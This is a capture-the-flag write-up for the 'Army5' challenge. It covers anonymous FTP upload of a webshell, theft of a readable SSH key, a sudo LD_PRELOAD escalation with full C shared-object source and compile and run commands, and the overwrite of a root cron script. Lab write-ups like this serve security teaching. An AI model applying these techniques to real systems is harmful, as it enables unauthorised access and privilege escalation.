# Army5

>
> ### user: PWNX{dbdb59ae9a73555ed0a846c82dccf368}
>

## Description

A web server with some other exposed services

## Technical description

The challenge exposes three open ports, SSH, FTP, and HTTP. The RCE is obtained via the upload of a malicious file into the HTTP uploads/ directory, the upload is possible due to a misconfiguration in the FTP service which allows any anonymous user to login and write in that folder. With the RCE the attacker, due to incorrect permissions, is able to read the pwnx user ssh key and login via SSH as pwnx user.

## Writeup

The challenge presents three open ports:

```text
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

The Web Application only displays a message that tells the user to enumerate the application. Upon enumeration the user can find the /uploads folder on the webroot.

gobuster -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://10.90.239.248 

```text
=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.90.239.248/
[+] Threads      : 10
[+] Wordlist     : /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2024/04/04 18:26:03 Starting gobuster
=====================================================
/uploads (Status: 301)
/. (Status: 200)
```

If the user tries to visit that folder, a 403 response is given to the user and no additional things have been found in the enumeration process.

Trying to connect to the FTP service, the attacker can notice that the anonymous login is enabled

```bash
$ ftp anonymous@10.90.239.248                                                                                                                             ⏎
Connected to 10.90.239.248.
220 ProFTPD Server (Debian) [::ffff:10.90.239.248]
331 Anonymous login ok, send your complete email address as your password
Password:
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||9957|)
150 Opening ASCII mode data connection for file list
-rwxr-xr-x   1 0        0             783 Apr  4 16:12 index.html
-rwxr-xr-x   1 0        0           53293 Apr  4 16:09 pwnx-logo.png
drwxrwxrwx   1 101      nogroup      4096 Apr  4 16:24 uploads
226 Transfer complete
ftp>
```

From the results of the `ls` command seems like the attacker landed in the webroot. Trying to upload files into the webroot didn't worked, but it does instead in the uploads directory giving to the attacker the possibility to upload a webshell and gain Remote Code Execution.

With the RCE the attacker can land on the system as the `www-data` user, so at this point the attacker has to elevate his privileges in order to read the flag. Unfortunately for the pwnx user, his home directory and ssh key file both have invalid permissions, so the attacker is able to read the key and elevate its privileges to the pwnx user.

The pwnx user can execute the `id` binary with sudo permissions

```bash
Matching Defaults entries for pwnx on ip-10-90-239-248:
    env_reset, env_keep=LD_PRELOAD, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User pwnx may run the following commands on ip-10-90-239-248:
    (bob) NOPASSWD: /usr/bin/id
```

The attacker at this point couldn't obtain too much with just the "id" command if wouldn't be for the env_keep directive in the sudoers file. That directive tells the sudo binary that any command is executed by the pwnx user as sudo, it should also preserve the `LD_PRELOAD` environment variable.

This opens up the possibility of escalating to the `bob` user for the attacker. To gain the bob user the attacker first needs to write the LD_PRELOAD shared object to use when executing the "id" binary.

```c
void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
```

As said before, this code should be compiled as shared object, to do so we can use the following command. The values in the `setuid` and `setgid` function calls are obtained using the command `id -u bob` on the target system, the attacker is forced to use that value because any other value (also `0`) would fallback to that id since at the end the `id` binary is executed by sudo using the bob user privileges.

```bash
gcc -fPIC -shared -nostartfiles -o exploit.so exploit.c
```

Then we can copy the compiled shared object into the target system using utility such as `scp`

```bash
scp -i pwnx.key ./exploit.so pwnx@10.90.239.248:
```

Then, to exploit the issue the attacker needs to execute the followint command

```bash
sudo LD_PRELOAD=./exploit.so -u bob /usr/bin/id
```

At this point the attacker obtains the "bob" user shell. Here the attacker sees that the user has a `stats.sh` file owned by root and not writeable in the home directory.

Also in the system there is a crontab which execute the file `/home/bob/stat.sh` as root user. Now the attacker in order to gain root and complete the challenge has to write the file `stat.sh` in the bob user home directory and give the permissions to execute the file to any user.

```bash
echo 'cp /root/flag.txt /home/bob/flag.txt && chown -R bob /home/bob' > /home/bob/stat.sh && chmod +x /home/bob/stat.sh
```

After some time will obtain the flag in the bob user home directory.
